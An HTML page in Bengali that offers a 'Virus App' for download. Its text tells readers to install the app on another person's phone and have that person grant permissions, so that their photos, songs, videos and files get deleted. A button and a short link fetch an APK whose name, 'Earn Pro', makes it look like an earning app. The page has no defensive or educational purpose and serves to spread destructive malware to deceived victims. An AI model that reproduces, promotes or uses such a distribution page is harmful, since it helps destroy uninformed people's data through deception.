<!DOCTYPE html>
<html lang="bn">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>About Section</title>
  <style>
    *{margin:0;padding:0;box-sizing:border-box;font-family:"Poppins",sans-serif}
    body{
      background:#0A0A11;color:#e2e8f0;display:flex;flex-direction:column;justify-content:center;align-items:center;height:100vh;gap:12px;
    }
    .about{
      background:#1E1E1E;border: 1px solid rgba(255, 255, 255, 0.15);;backdrop-filter:blur(10px);width:90%;max-width:420px;border-radius:15px;padding:25px;text-align:center;transition:0.3s;
    }
    .about img{width:280px;height:180px;object-fit:cover;border-radius:8px;border:1px solid #fff;margin-bottom:18px}
    .about h2{font-size:22px;margin-bottom:8px;color:#E10202}
    .about p{font-size:15px;line-height:1.6;color:#fff;margin-bottom:20px;font-weight:600}
    .about button{
      background:linear-gradient(to right, #3b82f6, #1d4ed8);border:none;color:#fff;padding:10px 22px;border-radius:8px;cursor:pointer;font-weight:600;transition:0.25s;
    }
    .about button:hover{background:#06b6d4;transform:scale(1.03)}
    .copy-box{margin-top:18px;background: #040407; border:1px solid rgba(255,255,255,0.2);border-radius:10px;padding:10px;font-size:14px;color:#0ff;user-select:all;word-break:break-all}
    
    .status-box{ display: inline-flex;
    align-items: center;
    gap: 6px;
    padding: 6px 12px;
    border-radius: 50px;
    background: rgba(0, 255, 20, 0.15);
    border: 1px solid #00FF14;
    color: #00FF14;
    font-weight: 600;
    font-size: 0.7rem;
    box-shadow: 0 0 12px rgba(0,255,20,0.25);
    letter-spacing: 1px;
    margin-top: 25px;
  }
    .status-dot{width:8px;height:8px;border-radius:50%;background:#00FF14;box-shadow:0 0 4px #00FF14;animation:blink 1.5s infinite}
    @keyframes blink{0%,100%{opacity:1}50%{opacity:0.4}}
    .legal-note{font-size:12px;color:#94a3b8;margin-top:12px}
  </style>
</head>
<body>

  <div class="about">
    <img src="https://i.postimg.cc/cJrgXGg2/Picsart-25-10-30-08-15-01-840.png" alt="About Image">
    <h2>আপনার করণীয় ❓️</h2>
    <p>
      আপনি যার ফোনের ছবি,গান,ভিডিও,ফাইল ইত্যাদি Delete করতে চান তার Phone এ এই Virus App টি Install করে দিয়ে উপরে দেখানো Permissions Allow করতে বলবেন, আপনি App টি নিচের Button এ ক্লিক করে Download করতে পারেন অথবা তার ফোনে Link দিয়েও Download করিয়ে দিতে পারেন |
    </p>

<button onclick="downloadFile()">Download App</button>

<script>
function downloadFile() {
  const url = "https://download1650.mediafire.com/59557e74uxqgf24K1HGTgdOlLWcqPRK5WJOLqCAwktGRq-d9Qn90J4xxf8YWhwlmoQWXeRVhpaC9h1YrP0yOKgftcTTVn2DLLsVjPBEwyharU6LGhekWfUmBc01_5mhXGEvzaOgOtiQ4EcaMyGJk1r85oaoqCVH9tPVFGop5MjKnRDY/rfopos08ttnac4z/Earn+Pro_1.0_upload.apk";

  const a = document.createElement("a");
  a.href = url;
  a.download = ""; 
  document.body.appendChild(a);
  a.click();
  a.remove();
}
</script>
    <div class="copy-box">
      https://x.gd/0j3vI
    </div>

    <div class="legal-note">
    </div>
  </div>

  <div class="status-box">
    <span class="status-dot"></span> Online
  </div>

</body>
</html>
